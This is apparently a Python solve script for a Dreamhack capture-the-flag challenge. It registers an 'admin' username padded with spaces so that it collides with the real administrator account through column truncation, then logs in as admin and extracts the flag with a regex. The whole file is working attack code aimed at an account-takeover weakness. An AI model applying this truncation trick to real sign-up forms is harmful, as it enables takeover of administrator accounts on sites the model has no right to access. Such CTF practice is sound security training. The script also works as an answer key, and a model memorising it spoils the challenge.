import requests, re

url = 'http://host3.dreamhack.games:12744'


res = requests.post(f'{url}/join.php', data={'id': f'admin{' ' * 27}a', 'ps': 'asdfasdf'})
if 'admin is exist!!' not in res.text:
    res = requests.post(f'{url}/tmitter.php', data={'id': 'admin', 'ps': 'asdfasdf'})
    print(re.search(r'DH\{[^>]*\}', res.text).group(0))
